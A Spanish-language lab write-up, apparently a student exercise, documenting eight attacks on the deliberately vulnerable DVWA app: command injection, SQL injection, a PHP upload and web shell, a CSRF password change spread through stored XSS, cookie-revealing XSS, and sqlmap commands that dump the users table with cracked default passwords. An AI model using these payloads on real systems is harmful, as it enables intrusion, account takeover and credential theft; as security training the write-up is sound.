Documentación de ataque DVWA


# 1º Ataque

## Descripción del Ataque
Inyectar comandos

### Pasos para Realizar el Ataque:
Entrando en la sección de Comando Injection y ejecutamos el comando:

```bash
8.8.8.8 | ls 
```

### Resultado
Podemos ver la información de los archivo que hay en la raíz

# 2º Ataque

## Descripción del Ataque
Inyectar consultas de sql, como encontrar todos los usuarios que hay en la base de datos

### Pasos para Realizar el Ataque:
En el apartado SQL injection introduzco ' OR '1'='1

### Resultado
Puedo ver todos los usuario con su id almacenados en la base de datos, con su ID, Nombre y Apellido

# 3º Ataque

## Descripción del Ataque
Subir archivo que nos saquen información de la página como por ejemplo un .php

### Pasos para Realizar el Ataque:
Vamos al apartado File Upload y subimos un archivo desde nuestro dispositivo a servidor y que dará la ruta donde se guarda.

ARHCIVO PARA SABER INFORMACIÓN DE PHP
```php
<?php
// Este script proporcionará información detallada sobre el sistema PHP
phpinfo();
?>
<script>
system("ls");
</script>
```

### Resultado

Nos proporciona información php del servidor, en la ruta que se ha subido el archivó.

# 4º Ataque

## Descripción del Ataque
Vamos a implementar una Shell en el servidor para poder ejecutar mejor los comandos

### Pasos para Realizar el Ataque:
Solo tendríamos que subir un archivo shell.php de GitHub como p0wny-shell 
Ir a la url y ejecutar la shell
http://localhost:8800/hackable/uploads/shell.php

### Resultado
Nos proporciona una Shell para ejecutar comandos.

# 5º Ataque

## Descripción del Ataque
Ver las fotos de los usuarios

### Pasos para Realizar el Ataque:
Solo tendríamos que ir a la url /hackeable/users y podemos ver los archivos .jpg de cada usuario

### Resultado
Ver las fotos que han subido los usuarios

# 6º Ataque

## Descripción del Ataque

El objetivo de este ataque es hacer que un usuario cambie su contraseña a una específica sin darse cuenta. Esto se logra mediante el uso de un enlace malicioso que contiene los parámetros necesarios para realizar el cambio de contraseña.

### Pasos para Realizar el Ataque:

1. **Cambiar la contraseña y copiar la URL**:
   - Primero, cambiamos nuestra propia contraseña en la aplicación utilizando la URL siguiente, donde `hola` es la nueva contraseña:
   
   ```url
   http://localhost:8800/vulnerabilities/csrf/?password_new=hola&password_conf=hola&Change=Change#
    ```

2. **Engañar al usuario para que pinche el enlace**:

    - Después, tenemos que conseguir que algún usuario pinche en este enlace para que su contraseña se cambie a la que nosotros queramos.

    Para lograrlo, publicamos un mensaje en la sección de **XSS (Stored)** con un enlace que parezca atractivo para el usuario.

    Como hay una limitación de caracteres, primero publicamos un mensaje normal y luego lo editamos para incluir el contenido malicioso.

```plaintext
txtName=Fifa+25&mtxMessage=%3Chtml%3E%0A%20%20%20%20%3Ca%20href=%22http://localhost:8800/vulnerabilities/csrf/?password_new=hola&password_conf=hola&Change=Change#%22%3EDescargar%3C/a%3E+&btnSign=Sign+Guestbook
```
3. **Cuando el usuario pinche en el enlace tendrá la contraseña cambiada, tan solo tendríamos que cambiarla de nuevo para que no pueda recuperarla el usuario, que la ha cambiado**

# 7º Ataque

## Descripción del Ataque
Con seguir la cookie de esta sesión

### Pasos para Realizar el Ataque:

Añadir un mensaje en le apartado **XSS (Stored)** y en el mensaje añadirmos: 
<script>alert(document.cookie)</script>

### Resultado

Nos saldrá una alerta con la información de al cookie

# 8º Ataque

## Descripción del Ataque
Con seguir tablas y usuarios, con su contraseña

### Pasos para Realizar el Ataque:

- El primer paso es obtener las tablas de la base de datos utilizando una inyección SQL. Ejecutamos el siguiente comando para listar todas las tablas presentes en la base de datos `dvwa`:

```bash 

sqlmap -u "http://10.0.2.51:8800/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=t7rn1e3gto9jcquf82kntsrbk3" -D dvwa --tables

```
- Para obtener los usuarios y las contraseñas almacenadas en la base de datos, ejecutamos el siguiente comando que también aplicará un diccionario (wordlist.txt) para descifrar las contraseñas:

```bash
sqlmap -u "http://10.0.2.51:8800/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=t7rn1e3gto9jcquf82kntsrbk3" -D dvwa -T users --dump
```

### Resultado

- Nos dará resultado toda la información de la tabla usuarios

| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2024-10-22 17:02:34 | 0            |
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2024-10-22 17:02:34 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2024-10-22 17:02:34 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2024-10-22 17:02:34 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2024-10-22 17:02:34 | 0            |
